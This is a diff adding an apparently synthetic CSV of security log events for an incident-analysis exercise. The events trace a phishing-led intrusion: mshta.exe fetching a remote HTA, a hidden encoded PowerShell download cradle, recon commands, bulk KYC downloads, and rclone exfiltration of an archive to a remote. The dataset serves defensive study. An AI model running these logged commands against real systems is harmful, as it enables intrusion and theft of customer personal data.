@@ -1,0 +1,90 @@
+event_id,timestamp,detail,url,verdict,source
+E00305,2026-09-11 16:54:12,Action required: 2026 employee benefits review,https://ofservices-portal.com/benefits-review,ALLOW,Email gateway
+E00307,2026-09-11 17:01:44,Reminder: benefits review closes today,https://ofservices-portal.com/benefits-review,ALLOW,Email gateway
+P00378,2026-09-11 17:02:07,chrome.exe | chrome.exe https://ofservices-portal.com/benefits-review | Medium,,,Endpoint (EDR)
+P00379,2026-09-11 17:03:19,mshta.exe | mshta.exe https://ofservices-portal.com/assets/update.hta | High,,,Endpoint (EDR)
+D00310,2026-09-11 17:03:31,ofservices-portal.com 84512B DLP=URL-RISK-MONITOR ALLOW,,,Proxy/DLP
+P00380,2026-09-11 17:03:44,powershell.exe | powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA | Critical,,,Endpoint (EDR)
+P00381,2026-09-11 17:04:12,"rundll32.exe | rundll32.exe C:\Users\Public\wupdate.dat,Start | Critical",,,Endpoint (EDR)
+D00311,2026-09-11 17:05:02,sync-statistics.net 912B DLP=NONE ALLOW,,,Proxy/DLP
+D00313,2026-09-11 17:10:02,sync-statistics.net 1044B DLP=NONE ALLOW,,,Proxy/DLP
+D00314,2026-09-11 17:15:03,sync-statistics.net 986B DLP=NONE ALLOW,,,Proxy/DLP
+V00219,2026-09-11 18:03:25,,,,VPN
+V00222,2026-09-11 18:18:05,102.134.88.19 (ZA) FAILURE/DENIED,,,VPN
+V00223,2026-09-11 18:18:29,102.134.88.19 (ZA) FAILURE/DENIED,,,VPN
+V00224,2026-09-11 18:18:58,102.134.88.19 (ZA) FAILURE/TIMEOUT,,,VPN
+V00225,2026-09-11 18:19:22,102.134.88.19 (ZA) FAILURE/DENIED,,,VPN
+V00226,2026-09-11 18:20:11,102.134.88.19 (ZA) SUCCESS/APPROVED,,,VPN
+V00227,2026-09-11 18:22:01,,,,VPN
+P00388,2026-09-11 18:25:33,"net.exe | net.exe group ""Domain Admins"" /domain | High",,,Endpoint (EDR)
+P00389,2026-09-11 18:26:09,nltest.exe | nltest.exe /dclist:ofs.local | High,,,Endpoint (EDR)
+X00753,2026-09-11 18:27:21,"READ HR_CONFIDENTIAL /hr/terminations/2026/terminations.xlsx (DENIED, 0B)",,,File/KYC server
+X00754,2026-09-11 18:28:03,"READ PAYROLL_READ /payroll/monthly/2026-08/payroll.csv (DENIED, 0B)",,,File/KYC server
+X00757,2026-09-11 18:30:17,"READ CRM_BASIC /crm/customer/profile/record-7742.json (SUCCESS, 18421B)",,,File/KYC server
+X00759,2026-09-11 18:33:42,"LIST CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3 (SUCCESS, 1280B)",,,File/KYC server
+X00760,2026-09-11 18:34:00,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50000.pdf (SUCCESS, 7737122B)",,,File/KYC server
+X00761,2026-09-11 18:34:19,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50001.pdf (SUCCESS, 4773356B)",,,File/KYC server
+X00762,2026-09-11 18:34:38,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50002.pdf (SUCCESS, 8439696B)",,,File/KYC server
+X00763,2026-09-11 18:34:57,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50003.pdf (SUCCESS, 9008704B)",,,File/KYC server
+X00764,2026-09-11 18:35:16,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50004.pdf (SUCCESS, 7601086B)",,,File/KYC server
+X00765,2026-09-11 18:35:35,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50005.pdf (SUCCESS, 3715799B)",,,File/KYC server
+X00766,2026-09-11 18:35:54,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50006.pdf (SUCCESS, 6663456B)",,,File/KYC server
+X00767,2026-09-11 18:36:13,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50007.pdf (SUCCESS, 6979710B)",,,File/KYC server
+X00768,2026-09-11 18:36:32,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50008.pdf (SUCCESS, 3849407B)",,,File/KYC server
+X00769,2026-09-11 18:36:51,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50009.pdf (SUCCESS, 3703951B)",,,File/KYC server
+X00770,2026-09-11 18:37:10,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50010.pdf (SUCCESS, 9857783B)",,,File/KYC server
+X00771,2026-09-11 18:37:29,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50011.pdf (SUCCESS, 4582042B)",,,File/KYC server
+X00772,2026-09-11 18:37:48,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50012.pdf (SUCCESS, 10117797B)",,,File/KYC server
+X00773,2026-09-11 18:38:07,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50013.pdf (SUCCESS, 5027531B)",,,File/KYC server
+X00774,2026-09-11 18:38:26,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50014.pdf (SUCCESS, 6050156B)",,,File/KYC server
+X00775,2026-09-11 18:38:45,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50015.pdf (SUCCESS, 4831921B)",,,File/KYC server
+X00776,2026-09-11 18:39:04,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50016.pdf (SUCCESS, 7430379B)",,,File/KYC server
+X00777,2026-09-11 18:39:23,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50017.pdf (SUCCESS, 9406573B)",,,File/KYC server
+X00778,2026-09-11 18:39:42,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50018.pdf (SUCCESS, 4505739B)",,,File/KYC server
+X00779,2026-09-11 18:40:01,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50019.pdf (SUCCESS, 5272339B)",,,File/KYC server
+X00780,2026-09-11 18:40:20,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50020.pdf (SUCCESS, 7508739B)",,,File/KYC server
+X00781,2026-09-11 18:40:39,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50021.pdf (SUCCESS, 6593940B)",,,File/KYC server
+X00782,2026-09-11 18:40:58,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50022.pdf (SUCCESS, 7329651B)",,,File/KYC server
+X00783,2026-09-11 18:41:17,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50023.pdf (SUCCESS, 7503345B)",,,File/KYC server
+X00784,2026-09-11 18:41:36,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50024.pdf (SUCCESS, 3763665B)",,,File/KYC server
+X00785,2026-09-11 18:41:55,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50025.pdf (SUCCESS, 9225516B)",,,File/KYC server
+X00786,2026-09-11 18:42:14,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50026.pdf (SUCCESS, 4988296B)",,,File/KYC server
+X00787,2026-09-11 18:42:33,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50027.pdf (SUCCESS, 3342303B)",,,File/KYC server
+X00788,2026-09-11 18:42:52,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50028.pdf (SUCCESS, 6960668B)",,,File/KYC server
+X00789,2026-09-11 18:43:11,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50029.pdf (SUCCESS, 9870013B)",,,File/KYC server
+X00790,2026-09-11 18:43:30,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50030.pdf (SUCCESS, 4897948B)",,,File/KYC server
+X00791,2026-09-11 18:43:49,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50031.pdf (SUCCESS, 8833144B)",,,File/KYC server
+X00792,2026-09-11 18:44:08,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50032.pdf (SUCCESS, 9705292B)",,,File/KYC server
+X00793,2026-09-11 18:44:27,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50033.pdf (SUCCESS, 10477085B)",,,File/KYC server
+X00794,2026-09-11 18:44:46,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50034.pdf (SUCCESS, 8713059B)",,,File/KYC server
+X00795,2026-09-11 18:45:05,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50035.pdf (SUCCESS, 5063804B)",,,File/KYC server
+V00235,2026-09-12 00:07:48,102.134.88.19 (ZA) SUCCESS/APPROVED,,,VPN
+X00811,2026-09-12 00:11:00,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-700.zip (SUCCESS, 34045328B)",,,File/KYC server
+X00812,2026-09-12 00:11:31,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-701.zip (SUCCESS, 34572483B)",,,File/KYC server
+X00813,2026-09-12 00:12:02,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-702.zip (SUCCESS, 37874611B)",,,File/KYC server
+X00814,2026-09-12 00:12:33,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-703.zip (SUCCESS, 21601461B)",,,File/KYC server
+X00815,2026-09-12 00:13:04,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-704.zip (SUCCESS, 19143497B)",,,File/KYC server
+X00816,2026-09-12 00:13:35,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-705.zip (SUCCESS, 30788621B)",,,File/KYC server
+X00817,2026-09-12 00:14:06,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-706.zip (SUCCESS, 32939782B)",,,File/KYC server
+X00818,2026-09-12 00:14:37,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-707.zip (SUCCESS, 20777458B)",,,File/KYC server
+X00819,2026-09-12 00:15:08,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-708.zip (SUCCESS, 24530755B)",,,File/KYC server
+X00820,2026-09-12 00:15:39,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-709.zip (SUCCESS, 37454914B)",,,File/KYC server
+X00821,2026-09-12 00:16:10,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-710.zip (SUCCESS, 33675107B)",,,File/KYC server
+X00822,2026-09-12 00:16:41,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-711.zip (SUCCESS, 18757304B)",,,File/KYC server
+X00823,2026-09-12 00:17:12,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-712.zip (SUCCESS, 29658376B)",,,File/KYC server
+X00824,2026-09-12 00:17:43,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-713.zip (SUCCESS, 31263823B)",,,File/KYC server
+X00825,2026-09-12 00:18:14,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-714.zip (SUCCESS, 19762605B)",,,File/KYC server
+X00826,2026-09-12 00:18:45,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-715.zip (SUCCESS, 33382492B)",,,File/KYC server
+X00827,2026-09-12 00:19:16,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-716.zip (SUCCESS, 19968042B)",,,File/KYC server
+X00828,2026-09-12 00:19:47,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-717.zip (SUCCESS, 31585218B)",,,File/KYC server
+X00829,2026-09-12 00:20:18,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-718.zip (SUCCESS, 30891629B)",,,File/KYC server
+X00830,2026-09-12 00:20:49,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-719.zip (SUCCESS, 35345200B)",,,File/KYC server
+X00831,2026-09-12 00:21:20,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-720.zip (SUCCESS, 29672310B)",,,File/KYC server
+X00832,2026-09-12 00:21:51,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-721.zip (SUCCESS, 20716718B)",,,File/KYC server
+X00833,2026-09-12 00:22:22,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-722.zip (SUCCESS, 36369013B)",,,File/KYC server
+X00834,2026-09-12 00:22:53,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/batch-723.zip (SUCCESS, 19811090B)",,,File/KYC server
+P00395,2026-09-12 00:26:16,7z.exe | 7z.exe a -tzip C:\Users\Public\kyc_q3.zip \FS-KYC-01\Exports\2026-Q3\* | Critical,,,Endpoint (EDR)
+P00396,2026-09-12 00:35:44,rclone.exe | rclone.exe copy C:\Users\Public\kyc_q3.zip remote:ofs-sync --transfers 4 | Critical,,,Endpoint (EDR)
+D00333,2026-09-12 00:36:12,cdn-storage-sync.net 284332118B DLP=CUSTOMER-PII-BULK ALLOW,,,Proxy/DLP
+D00334,2026-09-12 00:43:51,cdn-storage-sync.net 972116441B DLP=CUSTOMER-PII-BULK BLOCK,,,Proxy/DLP
+D00335,2026-09-12 00:44:07,cdn-storage-sync.net 22441882B DLP=CUSTOMER-PII-BULK BLOCK,,,Proxy/DLP
